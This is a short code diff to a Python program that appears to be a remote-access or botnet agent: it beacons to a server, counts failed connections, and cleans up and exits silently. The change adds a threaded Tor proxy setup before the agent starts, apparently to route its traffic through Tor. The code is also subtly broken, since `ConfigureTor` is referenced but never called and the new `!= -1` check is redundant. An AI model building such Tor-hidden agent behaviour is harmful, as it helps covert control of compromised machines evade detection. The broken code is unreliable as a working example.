@@ -43,6 +43,13 @@ def threaded(func):
         return
     return wrapper
 
+class TorServiceSetup(object):
+
+    @threaded
+    def StartService(self):
+        TorProxy = Proxy()
+        TorProxy.ConfigureTor
+
 
 class Agent(object):
 
@@ -373,15 +380,17 @@ class Agent(object):
                 failed_connections += 1
                 self.update_consecutive_failed_connections(failed_connections)
                 self.log("Consecutive failed connections: %d" % failed_connections)
-                if failed_connections > config.MAX_FAILED_CONNECTIONS:
-                    self.silent = True
-                    self.clean()
-                    self.exit()
+                if failed_connections != -1:
+                    if failed_connections > config.MAX_FAILED_CONNECTIONS:
+                        self.silent = True
+                        self.clean()
+                        self.exit()
                 time.sleep(config.HELLO_INTERVAL)
 
 def main():
-    Proxy()
-    time.sleep(10)
+    tor = TorServiceSetup()
+    tor.StartService()
+    time.sleep(20)
     agent = Agent()
     agent.run()
 
